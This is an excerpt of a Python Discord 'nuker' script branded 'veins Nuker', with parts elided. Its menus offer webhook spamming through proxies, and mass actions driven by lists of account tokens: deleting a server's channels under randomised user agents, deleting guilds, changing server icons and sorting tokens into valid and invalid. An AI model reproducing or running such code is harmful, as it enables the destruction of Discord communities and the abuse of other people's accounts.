...
if not os.path.exists('./VEINS'):
    os.system('md veins')
    with open('/data/data/com.termux/files/home/Veins/useragents.txt', 'w') as file:
        ua = UserAgent()
        file.write('\n'.join([ua.random for _ in range(50)]))
elif os.path.exists('./veins') and not os.path.exists('/data/data/com.termux/files/home/Veins/useragents.txt'):
    with open('/data/data/com.termux/files/home/Veins/useragents.txt', 'w') as file:
        ua = UserAgent()
        file.write('\n'.join([ua.random for _ in range(50)]))
else:
 ...
 ▓██  █▒░▒███   ▒██▒▓██  ▀█ ██▒░ ▓██▄   
  ▒██ █░░▒▓█  ▄ ░██░▓██▒  ▐▌██▒  ▒   ██▒
   ...
   ░ ░░   ░ ░  ░ ▒ ░░ ░░   ░ ▒░░ ░▒  ░ ░
    ...
    > IBATLE//UXIE OFC3
    '''
    # Use only valid colors. Here, we use purple and reset
    b = Colorate.Vertical(Colors.DynamicMIX((Col.purple, Col.purple, Col.purple)), Center.XCenter(banner))
    print(b)
    print()

def print_(text):
    Write.Print(f'\n     {text}', Colors.purple, interval=0.01)
def input_():
    return input(f'{Col.purple}\n        >>> {Colors.reset}') or 'Bruh'

def print_err(err):
    print("\n     {0}[{1}]".format(Col.purple, err), end=f"{Colors.reset}")



def print_success(err):
    print('\n     {0}[+]{1} {2}'.format(Col.purple, err, "valor_adicional"), end=f'{Colors.reset}')
...
def send_webhook(url=str, content=str, proxy=None):
    try:
        req.post(url=url,
                json={"content": content, "username": "veins Nuker", "avatar_url": ""}
                ,proxies=proxy)
        print_success(url)
...
def random_useragent():
    with open('./Veins/mic/useragents.txt', 'r') as file:
...
async def webhookTools():
    ...
    webhook_txt = '''
        ...
        8. Exit
    '''
    Write.Print(webhook_txt, Colors.purplev, interval=0.003)
    ...
    if ch == '1':
        ...
        if not proxy or not proxy.lower().startswith('y'):
            ...
            Write.Print('\n     [??] How many proxies do you want to use? ', Colors.purple, interval=0.01)
            amount = input_()
...
async def tokenTools():
  ...
  7. Change Status               14. Change server icon         21. Delete all personal guilds   28. Exit
    ...
    '''
    Write.Print(tokens_txt, Colors.purple, interval=0.0005)
    ...
    if ch == '6':
        ...
        if guilid.isalnum() and len(tokens()) > 0: 
            ...
            for token in tokens():
                headers = {
                    "Authorization": token,
                    "X-Audit-Log-Reason": 'veins Nuker',
                    "User-Agent": random_useragent(),
                    "Content-Type": 'application/json'
                }
            ...
            if r.status_code == 200:
                ...
                def delete(channel):
                    b = req.delete(url=f"https://discord.com/api/channels/{channel}",
                               headers={ "Authorization": tokens()[0],
                                        "X-Audit-Log-Reason": "By veins Nuker",
                                        "User-Agent": random_useragent()})
    ...
    if ch == '23':
        ...
        if len(tokens()) > 0:
            ...
            for token in tokens(): 
                ...
                yon = input_()
                if yon.lower().startswith('y'):
                    with open("./veins/valids.txt", 'w') as file:
                        file.write('\n'.join(valids))
                    with open("./veins/invalids.txt", "w") as file:
                        file.write('\n'.join(invalids))
                    print_("[!!] Saved In /veins, Press Enter to continue")
                    input()
                await tokenTools()
    if ch == '24':
        print_logo()
        ...
        if guild_info.status_code == 200:
            bl = Col.light_blue ; re = Col.red ; pi = Col.pink ; cy = Col.cyan ; ye = Col.purple ; pu = Col.purple ; green = Col.green ; gray = Col.gray
            js = guild_info.json()
            name = js['name']
...
async def main_menu():
    ...
    menu_txt = '''
        << menu categoria. >> 
        1. Discord Token Tools
        2. Exit
        

    '''
    Write.Print(menu_txt, Colors.purple, interval=0.003)
    print_("[~] Choose an Option")
    choice = input_()
